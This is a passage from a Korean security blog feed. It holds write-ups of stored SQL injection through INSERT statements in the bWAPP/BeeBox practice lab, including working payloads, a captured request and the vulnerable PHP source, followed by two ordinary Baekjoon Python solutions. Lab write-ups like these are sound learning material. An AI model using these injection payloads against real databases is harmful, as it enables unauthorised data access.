      <content:encoded><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-5.png" alt="upload successful"><br>PHP의 SQLite 모듈을 사용하였다고 써져있다.</p><p>어떤 기능을 가진 페이지인지 확인하겠다.<br>입력 : <strong>test</strong><br>Button : Add Entry<br><img src="/images/pasted-6.png" alt="upload successful"></p><p>Button : Delete Entries<br><img src="/images/pasted-7.png" alt="upload successful"><br>확인을 해보니, Add 버튼은 Form에 입력한 데이터를 DB를 저장하는 기능이고, Delecte 버튼은 DB에 저장된 데이터를 삭제하는 기능이다.</p><p>Error를 일으켜 정보를 획득하겠다.<br>입력 : <strong>‘</strong><br><img src="/images/pasted-8.png" alt="upload successful"><br>오류 메시지는 출력이 안된다.<br>또한 <code>&#39; or &#39;1&#39; = &#39;1</code>의 경우는 어차피 페이지 기능이 DB에 저장된 데이터를 출력하는 거라서 여기선 필요없다.</p><p>아무런 정보가 없어서 추측을 해보겠다.<br>보통 이런 기능은 <strong>INSERT 문</strong>을 이용하여 DB에 데이터를 추가한다.<br>아마 <code>INSERT INTO table_name (column1, column2, ... column_N) VALUES (data, data,&#39;입력값&#39;, data);</code>으로 되어있을거라 추측이 된다.</p><p>저 INSERT 문으로 생각하고 SQL Injection를 시도하겠다.<br>INSERT 문에 대한 어떠한 정보도 얻을 수 없어서 <code>test&#39;);#</code>부터 시작하여 추가가 안되면, <code>test&#39;</code> 뒤에 <code>, &#39;&#39;</code>를 추가하여 SQLi를 진행하였다.<br>입력 : <strong>test’, ‘’);#</strong><br><img src="/images/pasted-9.png" alt="upload successful"></p><p>Form의 입력값이 뒤에서 두번째이며, Owner가 맨 뒤 자리인 것으로 확인되었다.<br>Owner의 자리를 이용하여 SQLi를 더 진행하겠다.</p><p>입력 : <strong>test’, sqlite_version());#</strong><br><img src="/images/pasted-10.png" alt="upload successful"></p><p>입력 : <strong>test’, (SELECT name FROM sqlite_master WHERE type=’table’ ));#</strong><br><img src="/images/pasted-11.png" alt="upload successful"></p><p>그 후의 SQLi은 전에 풀이했던 SQLite 문제에서 설명했으니 진행은 안하겠다.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p><strong>Function_external.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_check</span>(<span class="params">$data</span>)</span>&#123;    </span><br><span class="line">    <span class="keyword">return</span> $data;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sqli_12.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;INSERT INTO blog (id, date, entry, owner) VALUES (&quot;</span> . ++$id . <span class="string">&quot;,&#x27;&quot;</span> . date(<span class="string">&#x27;Y-m-d&#x27;</span>, time()) . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . $entry . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . $owner . <span class="string">&quot;&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure><p>예상한 INSERT 문이 맞았다.<br>Low 문제에선 아무런 검증 없이 바로 데이터를 return하였다.</p><hr><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>문제 풀이는 추후에 업데이트하겠다.</p><h3 id="Source-Code-1"><a href="#Source-Code-1" class="headerlink" title="Source Code"></a>Source Code</h3><p><strong>Function_external.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqli_check_4</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Not bulletproof</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Replaces a single quote (&#x27;)</span></span><br><span class="line">    $input = str_replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&#x27;&#x27;&quot;</span>, $data);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> $input;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>이 문제에선 High가 없다. Medium과 같다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/">PHP</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/BeeBox/">BeeBox</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-SQLite/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SQL Injection - Stored (Blog)</title>
      <link>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-Blog/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-Blog/</guid>
      <pubDate>Thu, 21 Jan 2021 19:31:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Low&quot;&gt;&lt;a href=&quot;#Low&quot; class=&quot;headerlink&quot; title=&quot;Low&quot;&gt;&lt;/a&gt;Low&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-1.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;페이지에 들</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-1.png" alt="upload successful"><br>페이지에 들어가니 전에 풀었던 HTML Injection - Stored (Blog) 문제의 잔재들이 보인다. DB 테이블이 같은 것로 활용하여 문제를 만든 것 같다.</p><p><img src="/images/pasted-2.png" alt="upload successful"><br>::입력 : ‘aaaaaaa::<br>Error를 일으켜서 Mysql를 사용하였다는 정보를 얻을 수 있었다.<br>또한 URL를 확인하니 파라미터가 없는 것을 알 수 있었다. -&gt; POST를 사용한다는 뜻</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/sqli_7.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.219.164</span><br><span class="line"><span class="attribute">Content-Length</span>: 18</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.219.164</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.219.164/bWAPP/sqli_7.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=03d4a89519816567dd8ed545ffa299c5; security_level=0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">entry=aaa&amp;blog=add</span><br></pre></td></tr></table></figure><p>Burp Suit를 이용하여 데이터가 어떻게 전송하는지 확인하였다.<br>입력한 데이터는 entry이라는 파라미터, blog 파라미터는 button의 결과값이다.</p><p>이제 SQLi이 되는지 확인하였다.<br>오류를 보니 아마 ::INSERT INTO Blog (컬럼1, 컬럼2) VALUES (‘입력값’, ‘bee’)::으로 추측된다.</p><p>계정명인 ::’bee’::에 Query를 넣어서 SQLi를 시도하겠다.<br><img src="/images/pasted-3.png" alt="upload successful"><br>::입력 : <code>test&#39;, (select @@version))#</code>:: -&gt; ::<code>INSERT INTO Blog (컬럼1, 컬럼2) VALUES (&#39;test&#39;,(select @@version))#, &#39;bee&#39;)</code>::<br>SQLi가 성공하였다. Union를 사용하여 테이블명, 컬럼명도 알아낼 수 있다.<br>이부분은 전에 풀이하였던 SQLi 문제에서 했던 방식대로 응용하여 시도하면 된다.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;blog&quot;</span>]))&#123;</span><br><span class="line">    $entry = sqli($_POST[<span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">    $owner = $_SESSION[<span class="string">&quot;login&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($entry == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        $message =  <span class="string">&quot;&lt;font color=\&quot;red\&quot;&gt;Please enter some text...&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;INSERT INTO blog (date, entry, owner) VALUES (now(),&#x27;&quot;</span> . $entry . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . $owner . <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        $recordset = $link-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$recordset)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Error: &quot;</span> . $link-&gt;error . <span class="string">&quot;&lt;br /&gt;&lt;br /&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Debugging</span></span><br><span class="line">        <span class="comment">// echo $sql;</span></span><br><span class="line"></span><br><span class="line">        $message = <span class="string">&quot;&lt;font color=\&quot;green\&quot;&gt;The entry was added to our blog!&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Medium-amp-High"><a href="#Medium-amp-High" class="headerlink" title="Medium &amp; High"></a>Medium &amp; High</h2><p>추후에 업로드하겠습니다.</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p><img src="/images/pasted-4.png" alt="upload successful"><br>Error를 일으키려고 했지만, 특정 문자를 치환하는 SQLi 검증이 있다.</p><h3 id="Source-Code-1"><a href="#Source-Code-1" class="headerlink" title="Source Code"></a>Source Code</h3><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="Source-Code-2"><a href="#Source-Code-2" class="headerlink" title="Source Code"></a>Source Code</h3><h2 id="SQL-Injection-종류"><a href="#SQL-Injection-종류" class="headerlink" title="SQL Injection 종류"></a>SQL Injection 종류</h2><ol><li>Error Based SQLi -&gt; 오류를 일으켜 DB 정보 획득</li><li>Union Based SQLi -&gt; Union를 이용하여 다른 테이블을 결합하여 데이터 획득</li><li>Blind SQLi -&gt; 에러나 정보를 얻을 수 없을 때 서버의 반응을 통해 데이터 획득</li><li>Stored Procedure SQLi -&gt; 프로시져를 이용하여 Shell을 실행하거나 Query 결과 획득</li><li>Boolead Based SQLi</li><li>Time Based SQLi</li></ol>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/">PHP</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/BeeBox/">BeeBox</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-Blog/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 1712번 문제</title>
      <link>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1712%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1712%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Wed, 30 Dec 2020 22:04:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;백준-1712번-문제&quot;&gt;&lt;a href=&quot;#백준-1712번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 1712번 문제&quot;&gt;&lt;/a&gt;백준 1712번 문제&lt;/h2&gt;&lt;h3 id=&quot;손익분기점&quot;&gt;&lt;a href=&quot;#손익분기점&quot; class</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="백준-1712번-문제"><a href="#백준-1712번-문제" class="headerlink" title="백준 1712번 문제"></a>백준 1712번 문제</h2><h3 id="손익분기점"><a href="#손익분기점" class="headerlink" title="손익분기점"></a>손익분기점</h3><h4 id="월드전자는-노트북을-제조하고-판매하는-회사이다-노트북-판매-대수에-상관없이-매년-임대료-재산세-보험료-급여-등-A만원의-고정-비용이-들며-한-대의-노트북을-생산하는-데에는-재료비와-인건비-등-총-B만원의-가변-비용이-든다고-한다"><a href="#월드전자는-노트북을-제조하고-판매하는-회사이다-노트북-판매-대수에-상관없이-매년-임대료-재산세-보험료-급여-등-A만원의-고정-비용이-들며-한-대의-노트북을-생산하는-데에는-재료비와-인건비-등-총-B만원의-가변-비용이-든다고-한다" class="headerlink" title="월드전자는 노트북을 제조하고 판매하는 회사이다. 노트북 판매 대수에 상관없이 매년 임대료, 재산세, 보험료, 급여 등 A만원의 고정 비용이 들며, 한 대의 노트북을 생산하는 데에는 재료비와 인건비 등 총 B만원의 가변 비용이 든다고 한다."></a>월드전자는 노트북을 제조하고 판매하는 회사이다. 노트북 판매 대수에 상관없이 매년 임대료, 재산세, 보험료, 급여 등 A만원의 고정 비용이 들며, 한 대의 노트북을 생산하는 데에는 재료비와 인건비 등 총 B만원의 가변 비용이 든다고 한다.</h4><h4 id="예를-들어-A-1-000-B-70이라고-하자-이-경우-노트북을-한-대-생산하는-데는-총-1-070만원이-들며-열-대-생산하는-데는-총-1-700만원이-든다"><a href="#예를-들어-A-1-000-B-70이라고-하자-이-경우-노트북을-한-대-생산하는-데는-총-1-070만원이-들며-열-대-생산하는-데는-총-1-700만원이-든다" class="headerlink" title="예를 들어 A=1,000, B=70이라고 하자. 이 경우 노트북을 한 대 생산하는 데는 총 1,070만원이 들며, 열 대 생산하는 데는 총 1,700만원이 든다."></a>예를 들어 A=1,000, B=70이라고 하자. 이 경우 노트북을 한 대 생산하는 데는 총 1,070만원이 들며, 열 대 생산하는 데는 총 1,700만원이 든다.</h4><h4 id="노트북-가격이-C만원으로-책정되었다고-한다-일반적으로-생산-대수를-늘려-가다-보면-어느-순간-총-수입-판매비용-이-총-비용-고정비용-가변비용-보다-많아지게-된다-최초로-총-수입이-총-비용보다-많아져-이익이-발생하는-지점을-손익분기점-BREAK-EVEN-POINT-이라고-한다"><a href="#노트북-가격이-C만원으로-책정되었다고-한다-일반적으로-생산-대수를-늘려-가다-보면-어느-순간-총-수입-판매비용-이-총-비용-고정비용-가변비용-보다-많아지게-된다-최초로-총-수입이-총-비용보다-많아져-이익이-발생하는-지점을-손익분기점-BREAK-EVEN-POINT-이라고-한다" class="headerlink" title="노트북 가격이 C만원으로 책정되었다고 한다. 일반적으로 생산 대수를 늘려 가다 보면 어느 순간 총 수입(판매비용)이 총 비용(=고정비용+가변비용)보다 많아지게 된다. 최초로 총 수입이 총 비용보다 많아져 이익이 발생하는 지점을 손익분기점(BREAK-EVEN POINT)이라고 한다."></a>노트북 가격이 C만원으로 책정되었다고 한다. 일반적으로 생산 대수를 늘려 가다 보면 어느 순간 총 수입(판매비용)이 총 비용(=고정비용+가변비용)보다 많아지게 된다. 최초로 총 수입이 총 비용보다 많아져 이익이 발생하는 지점을 손익분기점(BREAK-EVEN POINT)이라고 한다.</h4><h4 id="A-B-C가-주어졌을-때-손익분기점을-구하는-프로그램을-작성하시오"><a href="#A-B-C가-주어졌을-때-손익분기점을-구하는-프로그램을-작성하시오" class="headerlink" title="A, B, C가 주어졌을 때, 손익분기점을 구하는 프로그램을 작성하시오."></a>A, B, C가 주어졌을 때, 손익분기점을 구하는 프로그램을 작성하시오.</h4><p>Link : <a href="https://www.acmicpc.net/problem/1712">https://www.acmicpc.net/problem/1712</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">12</span>):</span><br><span class="line">    print(a+b*i)</span><br><span class="line">    print(c*i, <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">입력</span><br><span class="line">1000 70 170</span><br><span class="line"></span><br><span class="line">출력 결과</span><br><span class="line">1070</span><br><span class="line">170 </span><br><span class="line"></span><br><span class="line">1140</span><br><span class="line">340 </span><br><span class="line"></span><br><span class="line">1210</span><br><span class="line">510 </span><br><span class="line"></span><br><span class="line">1280</span><br><span class="line">680 </span><br><span class="line"></span><br><span class="line">1350</span><br><span class="line">850 </span><br><span class="line"></span><br><span class="line">1420</span><br><span class="line">1020 </span><br><span class="line"></span><br><span class="line">1490</span><br><span class="line">1190 </span><br><span class="line"></span><br><span class="line">1560</span><br><span class="line">1360 </span><br><span class="line"></span><br><span class="line">1630</span><br><span class="line">1530 </span><br><span class="line"></span><br><span class="line">1700</span><br><span class="line">1700 </span><br><span class="line"></span><br><span class="line">1770</span><br><span class="line">1870 </span><br></pre></td></tr></table></figure><p>문제를 이해하는데 좀 걸렸다.<br><br>문제를 쉽게 풀이하자면, 노트북을 생산하는데 들어가는 <strong>고정 비용</strong>, 재료비와 인건비를 합친 <strong>가변 비용</strong> 두 비용을 더해서 노트북 생산 금액이 측정이 된다.<br><br>예시대로, 고정 비용 - 1000, 가변 비용 - 70 이면, 노트북 2개를 생산하는 비용은 ** 고정 비용 + ( 가변 비용 * 2 ) **이라는 공식이 성립되고, 1140이라는 비용이 들게 된다.</p><p>판매값이 170이 측정이 될 때, 노트북 몇 대를 팔아야 생산 비용을 넘어설 수 있는지를 구하는 문제였다.</p><p>공식을 구하자면, ** 고정 비용 + (가변 비용 * X) &lt; 판매값 * X **이 성립이 된다.<br><br>여기서 ** 가변 비용 * X *<em>를 옆에 옮기면, ** 고정 비용 &lt; (판매값 - 가변 비용) \</em> X **이 된다.</p><p>우리의 목표는 x를 구하는 것이 목적이므로, x만 남기고 옆으로 넘긴다.<br><br>** 고정 비용 / (판매값 - 가변 비용) &lt; X **이라는 최종 공식이 구해지게 된다.</p><p>이 공식을 이용하여 문제풀이를 하겠다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c &lt;= b):</span><br><span class="line">    d = <span class="number">-1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    d = a//(c-b)+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p>여기서 더 풀이를 하자면, 판매값과 가변 비용의 크기 비교를 한 이유는 가변 비용의 크기가 판매값보다 크면, 공식이 음수로 되기 때문에 x가 0이라도 참이 된다. 그래서 예외 처리를 하였다.<br></p><p>else문을 보면 공식에 +1를 한 모습을 볼 수 있다. +1은 소수점을 반올림을 한 경우를 생각하여 더해주었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1712%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 5543번 문제</title>
      <link>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5543%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2020/12/30/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-5543%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Wed, 30 Dec 2020 22:03:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;백준-5543번-문제&quot;&gt;&lt;a href=&quot;#백준-5543번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 5543번 문제&quot;&gt;&lt;/a&gt;백준 5543번 문제&lt;/h2&gt;&lt;h3 id=&quot;상근날드&quot;&gt;&lt;a href=&quot;#상근날드&quot; class=&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="백준-5543번-문제"><a href="#백준-5543번-문제" class="headerlink" title="백준 5543번 문제"></a>백준 5543번 문제</h2><h3 id="상근날드"><a href="#상근날드" class="headerlink" title="상근날드"></a>상근날드</h3><h4 id="상근날드에서-가장-잘-팔리는-메뉴는-세트-메뉴이다-주문할-때-자신이-원하는-햄버거와-음료를-하나씩-골라-세트로-구매하면-가격의-합계에서-50원을-뺀-가격이-세트-메뉴의-가격이-된다"><a href="#상근날드에서-가장-잘-팔리는-메뉴는-세트-메뉴이다-주문할-때-자신이-원하는-햄버거와-음료를-하나씩-골라-세트로-구매하면-가격의-합계에서-50원을-뺀-가격이-세트-메뉴의-가격이-된다" class="headerlink" title="상근날드에서 가장 잘 팔리는 메뉴는 세트 메뉴이다. 주문할 때, 자신이 원하는 햄버거와 음료를 하나씩 골라, 세트로 구매하면, 가격의 합계에서 50원을 뺀 가격이 세트 메뉴의 가격이 된다."></a>상근날드에서 가장 잘 팔리는 메뉴는 세트 메뉴이다. 주문할 때, 자신이 원하는 햄버거와 음료를 하나씩 골라, 세트로 구매하면, 가격의 합계에서 50원을 뺀 가격이 세트 메뉴의 가격이 된다.</h4><h4 id="햄버거는-총-3종류-상덕버거-중덕버거-하덕버거가-있고-음료는-콜라와-사이다-두-종류가-있다"><a href="#햄버거는-총-3종류-상덕버거-중덕버거-하덕버거가-있고-음료는-콜라와-사이다-두-종류가-있다" class="headerlink" title="햄버거는 총 3종류 상덕버거, 중덕버거, 하덕버거가 있고, 음료는 콜라와 사이다 두 종류가 있다."></a>햄버거는 총 3종류 상덕버거, 중덕버거, 하덕버거가 있고, 음료는 콜라와 사이다 두 종류가 있다.</h4><h4 id="햄버거와-음료의-가격이-주어졌을-때-가장-싼-세트-메뉴의-가격을-출력하는-프로그램을-작성하시오"><a href="#햄버거와-음료의-가격이-주어졌을-때-가장-싼-세트-메뉴의-가격을-출력하는-프로그램을-작성하시오" class="headerlink" title="햄버거와 음료의 가격이 주어졌을 때, 가장 싼 세트 메뉴의 가격을 출력하는 프로그램을 작성하시오."></a>햄버거와 음료의 가격이 주어졌을 때, 가장 싼 세트 메뉴의 가격을 출력하는 프로그램을 작성하시오.</h4><p>Link : <a href="https://www.acmicpc.net/problem/5543">https://www.acmicpc.net/problem/5543</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">menu = [ i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">open</span>(<span class="number">0</span>)) ]</span><br><span class="line"><span class="built_in">sum</span> = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">sum</span>.append(menu[i] + menu[<span class="number">3</span>])</span><br><span class="line">    <span class="built_in">sum</span>.append(menu[i] + menu[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">print(<span class="built_in">sorted</span>(<span class="built_in">sum</span>)[<span class="number">0</span>]<span class="number">-50</span>)</span><br></pre></td></tr></table></figure><p>list를 사용하여 문제해결을 하였다.<br><br>하지만 많이 부족하다. 사실 최소값을 구하는 건 가장 작은 수 2개를 구해서 더해주면 되는데 위 방식은 모든 경우의 수를 구하여, 정렬시킨 것이라 비효율적이다.<br><br>효율적으로 수정하겠다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*p,q,r = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">open</span>(<span class="number">0</span>))</span><br><span class="line">print(<span class="built_in">min</span>(p)+<span class="built_in">min</span>(q,r)<span class="number">-50</span>)</span><br></pre></td></tr></table></figure><p>2번째 코드는 위에 설명한 대로 최소값 2개를 구하여 더하는 코드이다.<br><br>1번째 코드를 보면 좀 생소한 방식을 확인할 수 있다.<br><br><code>*p,q,r = map(int, open(0))</code>는 10개를 입력시 뒤에서 2개 빼고 앞의 8개는 p에 리스트로 저장이 된다.<br><br>뒤의 2개는 q, r에 저장이 되어서 음료의 최소값을 구하기가 더 수월하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*p,q,r = <span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">open</span>(<span class="number">0</span>)) <span class="comment"># 입력 : 1,2,3,4,5</span></span><br><span class="line">print(p) <span class="comment"># 출력 : [1, 2, 3]</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
